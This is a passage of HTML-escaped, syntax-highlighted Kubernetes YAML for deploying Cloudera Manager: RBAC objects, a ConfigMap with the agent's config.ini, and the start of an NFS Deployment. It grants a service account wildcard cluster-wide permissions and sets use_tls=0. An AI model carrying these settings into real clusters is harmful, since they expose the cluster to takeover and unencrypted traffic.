&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-cr&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cr&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;apiGroups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;resources&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;verbs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nonResourceURLs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;verbs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRoleBinding&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-crb&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;crb&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ServiceAccount&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-sa&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;roleRef&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRole&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-cr&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ConfigMap&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-config&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-config&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;master_host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-svc&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;cron.tab&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;*/30 * * * * ntpdate master-svc &amp;amp;&amp;amp; hwclock --systohc&lt;/span&gt;

  &lt;span class=&quot;s&quot;&gt;config.ini&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|-&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;[General]&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# Hostname of the CM server.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;server_host=master-svc&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Port that the CM server is listening on.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;server_port=7182&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;## It should not normally be necessary to modify these.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# Port that the CM agent should listen on.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# listening_port=9000&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# IP Address that the CM agent should listen on.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# listening_ip=&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Hostname that the CM agent reports as its hostname. If unset, will be&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# obtained in code through something like this:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#   python -c 'import socket; \&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#              print socket.getfqdn(), \&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#                    socket.gethostbyname(socket.getfqdn())'&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# listening_hostname=&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# An alternate hostname to report as the hostname for this host in CM.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# Useful when this agent is behind a load balancer or proxy and all&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# inbound communication must connect through that proxy.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# reported_hostname=&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Port that supervisord should listen on.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# NB: This only takes effect if supervisord is restarted.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# supervisord_port=19001&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Log file.  The supervisord log file will be placed into&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# the same directory.  Note that if the agent is being started via the&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# init.d script, /var/log/cloudera-scm-agent/cloudera-scm-agent.out will&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# also have a small amount of output (from before logging is initialized).&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# log_file=/var/log/cloudera-scm-agent/cloudera-scm-agent.log&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Persistent state directory.  Directory to store CM agent state that&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# persists across instances of the agent process and system reboots.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# Particularly, the agent's UUID is stored here.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# lib_dir=/var/lib/cloudera-scm-agent&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Parcel directory.  Unpacked parcels will be stored in this directory.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# Downloaded parcels will be stored in &amp;lt;parcel_dir&amp;gt;/../parcel-cache&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# parcel_dir=/opt/cloudera/parcels&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Enable supervisord event monitoring.  Used in eager heartbeating, amongst&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# other things.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# enable_supervisord_events=true&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Maximum time to wait (in seconds) for all metric collectors to finish&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# collecting data.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;max_collection_wait_seconds=10.0&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Maximum time to wait (in seconds) when connecting to a local role's&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# webserver to fetch metrics.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;metrics_url_timeout_seconds=30.0&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Maximum time to wait (in seconds) when connecting to a local TaskTracker&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# to fetch task attempt data.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;task_metrics_timeout_seconds=5.0&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The list of non-device (nodev) filesystem types which will be monitored.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;monitored_nodev_filesystem_types=nfs,nfs4,tmpfs&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The list of filesystem types which are considered local for monitoring purposes.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# These filesystems are combined with the other local filesystem types found in&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# /proc/filesystems&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;local_filesystem_whitelist=ext2,ext3,ext4,xfs&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The largest size impala profile log bundle that this agent will serve to the&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# CM server. If the CM server requests more than this amount, the bundle will&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# be limited to this size. All instances of this limit being hit are logged to&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# the agent log.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;impala_profile_bundle_max_bytes=1073741824&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The largest size stacks log bundle that this agent will serve to the CM&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# server. If the CM server requests more than this amount, the bundle will be&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# limited to this size. All instances of this limit being hit are logged to the&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# agent log.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;stacks_log_bundle_max_bytes=1073741824&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The size to which the uncompressed portion of a stacks log can grow before it&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# is rotated. The log will then be compressed during rotation.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;stacks_log_max_uncompressed_file_size_bytes=5242880&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The orphan process directory staleness threshold. If a diretory is more stale&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# than this amount of seconds, CM agent will remove it.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;orphan_process_dir_staleness_threshold=5184000&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The orphan process directory refresh interval. The CM agent will check the&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# staleness of the orphan processes config directory every this amount of&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# seconds.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;orphan_process_dir_refresh_interval=3600&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# A knob to control the agent logging level. The options are listed as follows:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# 1) DEBUG (set the agent logging level to 'logging.DEBUG')&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# 2) INFO (set the agent logging level to 'logging.INFO')&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;scm_debug=INFO&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The DNS resolution collecion interval in seconds. A java base test program&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# will be executed with at most this frequency to collect java DNS resolution&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# metrics. The test program is only executed if the associated health test,&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# Host DNS Resolution, is enabled.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;dns_resolution_collection_interval_seconds=60&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The maximum time to wait (in seconds) for the java test program to collect&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# java DNS resolution metrics.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;dns_resolution_collection_timeout_seconds=30&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The directory location in which the agent-wide kerberos credential cache&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# will be created.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# agent_wide_credential_cache_location=/var/run/cloudera-scm-agent&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;[Security]&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# Use TLS and certificate validation when connecting to the CM server.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;use_tls=0&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# The maximum allowed depth of the certificate chain returned by the peer.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# The default value of 9 matches the default specified in openssl's&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# SSL_CTX_set_verify.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;max_cert_depth=9&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# A file of CA certificates in PEM format. The file can contain several CA&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# certificates identified by&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# -----BEGIN CERTIFICATE-----&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# ... (CA certificate in base64 encoding) ...&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# -----END CERTIFICATE-----&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# sequences. Before, between, and after the certificates text is allowed which&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# can be used e.g. for descriptions of the certificates.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# The file is loaded once, the first time an HTTPS connection is attempted. A&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# restart of the agent is required to pick up changes to the file.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# Note that if neither verify_cert_file or verify_cert_dir is set, certificate&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# verification will not be performed.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# verify_cert_file=&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# Directory containing CA certificates in PEM format. The files each contain one&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# CA certificate. The files are looked up by the CA subject name hash value,&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# which must hence be available. If more than one CA certificate with the same&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# name hash value exist, the extension must be different (e.g. 9d66eef0.0,&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# 9d66eef0.1 etc). The search is performed in the ordering of the extension&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# number, regardless of other properties of the certificates. Use the c_rehash&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# utility to create the necessary links.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# The certificates in the directory are only looked up when required, e.g. when&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# building the certificate chain or when actually performing the verification&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# of a peer certificate. The contents of the directory can thus be changed&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# without an agent restart.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# When looking up CA certificates, the verify_cert_file is first searched, then&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# those in the directory. Certificate matching is done based on the subject name,&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# the key identifier (if present), and the serial number as taken from the&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# certificate to be verified. If these data do not match, the next certificate&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# will be tried. If a first certificate matching the parameters is found, the&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# verification process will be performed; no other certificates for the same&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# parameters will be searched in case of failure.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# Note that if neither verify_cert_file or verify_cert_dir is set, certificate&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# verification will not be performed.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# verify_cert_dir=&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# PEM file containing client private key.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# client_key_file=&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# A command to run which returns the client private key password on stdout&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# client_keypw_cmd=&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# If client_keypw_cmd isn't specified, instead a text file containing&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# the client private key password can be used.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# client_keypw_file=&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;# PEM file containing client certificate.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;# client_cert_file=&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;## Location of Hadoop files.  These are the CDH locations when installed by&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;## packages.  Unused when CDH is installed by parcels.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;[Hadoop]&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_crunch_home=/usr/lib/crunch&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_flume_home=/usr/lib/flume-ng&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_hadoop_bin=/usr/bin/hadoop&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_hadoop_home=/usr/lib/hadoop&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_hbase_home=/usr/lib/hbase&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_hbase_indexer_home=/usr/lib/hbase-solr&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_hcat_home=/usr/lib/hive-hcatalog&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_hdfs_home=/usr/lib/hadoop-hdfs&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_hive_home=/usr/lib/hive&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_httpfs_home=/usr/lib/hadoop-httpfs&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_hue_home=/usr/share/hue&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_hue_plugins_home=/usr/lib/hadoop&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_impala_home=/usr/lib/impala&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_llama_home=/usr/lib/llama&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_mr1_home=/usr/lib/hadoop-0.20-mapreduce&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_mr2_home=/usr/lib/hadoop-mapreduce&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_oozie_home=/usr/lib/oozie&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_parquet_home=/usr/lib/parquet&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_pig_home=/usr/lib/pig&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_solr_home=/usr/lib/solr&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_spark_home=/usr/lib/spark&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_sqoop_home=/usr/lib/sqoop&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_sqoop2_home=/usr/lib/sqoop2&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_yarn_home=/usr/lib/hadoop-yarn&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cdh_zookeeper_home=/usr/lib/zookeeper&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#hive_default_xml=/etc/hive/conf.dist/hive-default.xml&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#webhcat_default_xml=/etc/hive-webhcat/conf.dist/webhcat-default.xml&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#jsvc_home=/usr/libexec/bigtop-utils&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#tomcat_home=/usr/lib/bigtop-tomcat&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#oracle_home=/usr/share/oracle/instantclient&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;## Location of Cloudera Management Services files.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;[Cloudera]&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#mgmt_home=/usr/share/cmf&lt;/span&gt;

    &lt;span class=&quot;no&quot;&gt;## Location of JDBC Drivers.&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;[JDBC]&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;cloudera_mysql_connector_jar=/usr/java/latest/mysql-connector-java.jar&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cloudera_oracle_connector_jar=/usr/share/java/oracle-connector-java.jar&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#By default, postgres jar is found dynamically in $MGMT_HOME/lib&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;#cloudera_postgresql_jdbc_jar=&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: apps/v1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Deployment&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;name: nfs-deploy&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;name: nfs&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;replicas: 1&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;revisionHistoryLimit: 2&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;matchLabels:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;name: nfs&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;template:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;metadata:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;name: nfs-client&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;name: nfs&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;spec:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;tolerations:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- key: node-role.kubernetes.io/master&lt;/span&gt;
